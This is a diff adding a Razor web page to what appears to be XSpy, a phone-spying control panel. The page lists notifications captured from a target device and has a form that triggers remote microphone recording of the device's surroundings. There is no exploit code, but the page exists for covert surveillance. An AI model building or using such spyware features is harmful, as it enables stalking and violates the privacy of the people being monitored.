@@ -1,0 +1,111 @@
+﻿@{
+    ViewData["Title"] = "Notificações e ambiente";
+    ViewData["PageScript"] = "/js/app/device/notifications.js";
+
+}
+@using XSpy.Shared
+@model XSpy.Shared.Models.Views.Device.DeviceDataViewModel
+
+@section Styles {
+    <link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/v/bs4/jszip-2.5.0/dt-1.10.23/b-1.6.5/b-html5-1.6.5/b-print-1.6.5/r-2.2.7/datatables.min.css"/>
+}
+
+@section PreScripts
+{
+    <script>
+        window.deviceId = '@Model.Device.Id';
+    </script>
+}
+
+<section class="content">
+    <div class="container-fluid">
+        <partial name="Partial/QuickActions"/>
+
+        <div class="row">
+            <div class="col-6">
+                <div class="card">
+                    <div class="card-header">
+                        <h3 class="card-title">Notificações</h3>
+                    </div>
+                    <!-- /.card-header -->
+                    <div class="card-body">
+                        <table id="dataTable" class="table table-hover table-text-center" style="width: 100%">
+                            <thead>
+                            <tr>
+                                <th>Data</th>
+                                <th>Aplicativo</th>
+                                <th>Título</th>
+                                <th>Conteúdo</th>
+                            </tr>
+                            </thead>
+                            <tbody>
+
+                            @foreach (var notification in Model.Device.Notifications)
+                            {
+                                <tr>
+
+                                    <td>
+                                        @notification.Date
+                                    </td>
+                                    <td>
+                                        @notification.AppName
+                                    </td>
+                                    <td>
+                                        @notification.Title
+                                    </td>
+                                    <td>
+                                        @notification.Content
+                                    </td>
+                                </tr>
+                            }
+                            </tbody>
+                        </table>
+                    </div>
+                    <!-- /.card-body -->
+                </div>
+            </div>
+
+
+            <div class="col-6">
+                <div class="card">
+                    <div class="card-header">
+                        <h3 class="card-title">Escutar ambiente</h3>
+                    </div>
+                    <!-- /.card-header -->
+                    <form role="form" id="smsForm">
+                        <div class="card-body">
+                            <div class="row">
+                                <div class="col-sm-12">
+                                    @if (Model.Device.RecordingMicBlock != null && Model.Device.RecordingMicBlock.Value >= DateTime.Now)
+                                    {
+                                        <span>O dispositivo já está gravando, poderá solicitar uma nova gravação em @Model.Device.RecordingMicBlock</span>
+                                    }
+                                    else
+                                    {
+                                        <!-- textarea -->
+                                        <div class="form-group">
+                                            <label for="number">Segundos</label>
+                                            <input type="number" class="form-control" name="number" id="number" placeholder="" required="">
+                                        </div>
+                                    }
+                                </div>
+                            </div>
+                            <hr />
+                            @if (Model.Device.RecordingMicBlock != null && Model.Device.RecordingMicBlock.Value >= DateTime.Now)
+                            {
+                                <button type="button" disabled="disabled"  class="btn btn-primary float-right">Enviar</button>
+                            }
+                            else
+                            {
+                                <button type="button"  id="sendAudio" class="btn btn-primary float-right">Enviar</button>
+
+                            }
+                        </div>
+                    </form>
+                    <!-- /.card-body -->
+                </div>
+            </div>
+        </div>
+
+    </div>
+</section>
